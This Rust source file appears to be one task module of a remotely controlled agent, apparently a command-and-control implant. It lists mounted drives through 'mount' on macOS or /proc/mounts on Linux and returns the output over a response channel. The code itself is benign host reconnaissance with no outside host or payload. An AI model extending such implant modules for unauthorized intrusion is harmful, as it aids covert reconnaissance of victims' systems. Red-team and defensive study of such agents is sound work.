use crate::structs::Task;
use tokio::process::Command;

pub async fn execute(task: Task) {
    let mut response = task.new_response();

    #[cfg(target_os = "macos")]
    let result = Command::new("mount").output().await;

    #[cfg(target_os = "linux")]
    let result = tokio::fs::read_to_string("/proc/mounts").await.map(|s| {
        std::process::Output {
            status: std::process::ExitStatus::default(),
            stdout: s.into_bytes(),
            stderr: Vec::new(),
        }
    });

    #[cfg(target_os = "macos")]
    match result {
        Ok(output) => {
            response.user_output = String::from_utf8_lossy(&output.stdout).to_string();
            response.completed = true;
        }
        Err(e) => response.set_error(&format!("Failed to list drives: {}", e)),
    }

    #[cfg(target_os = "linux")]
    match result {
        Ok(output) => {
            response.user_output = String::from_utf8_lossy(&output.stdout).to_string();
            response.completed = true;
        }
        Err(e) => response.set_error(&format!("Failed to list drives: {}", e)),
    }

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
